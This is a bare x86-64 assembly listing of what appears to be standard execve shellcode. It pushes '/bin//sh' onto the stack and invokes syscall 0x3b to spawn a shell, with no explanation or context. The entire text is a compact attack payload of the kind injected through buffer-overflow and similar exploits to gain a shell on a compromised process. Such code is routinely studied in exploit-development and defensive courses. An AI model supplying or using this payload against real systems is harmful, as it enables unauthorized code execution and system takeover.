BITS 64
section .text
  global _start
    _start:
      xor     rdx, rdx
      xor     rsi, rsi
      push    rsi
      mov     rbx, 0x68732f2f6e69622f
      push    rbx
      push    rsp
      pop     rdi
      mov     al, 0x3b
      syscall 
